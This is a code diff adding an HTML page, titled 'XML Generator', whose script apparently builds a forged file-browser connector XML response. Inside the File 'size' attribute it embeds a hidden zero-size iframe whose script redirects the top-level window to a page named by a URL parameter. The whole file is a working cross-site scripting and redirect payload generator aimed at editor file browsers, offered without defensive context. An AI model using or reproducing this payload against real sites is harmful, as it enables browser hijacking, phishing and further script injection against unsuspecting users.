@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>XML Generator</title>
+</head>
+<body>
+<script>
+const params = new URLSearchParams(window.location.search);
+const mrf = params.get('mrf') || '';
+
+
+const base = window.location.origin +
+    window.location.pathname.replace(/[^/]*$/, '');
+
+
+const url = base + mrf + '.html';
+
+
+const escapeXML = str => str
+    .replace(/&/g, '&amp;')
+    .replace(/"/g, '&quot;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+
+
+const script = "<script>window.top.location.href='" +
+    url + "';<\/script>";
+
+
+const iframe = '<iframe height="0" width="0" srcdoc="' +
+    escapeXML(script) + '"></iframe>';
+
+
+const xml = '<?xml version="1.0" encoding="UTF-8"?>\n' +
+'<Connector command="GetFoldersAndFiles" resourceType="Document">\n' +
+'    <CurrentFolder path="/1 - f/" url=""/>\n' +
+'    <Files>\n' +
+'        <File desc="1" name="Loading..." size="' +
+escapeXML(iframe) + '"/>\n' +
+'    </Files>\n' +
+'</Connector>';
+
+
+document.body.textContent = xml;
+</script>
+</body>
+</html>
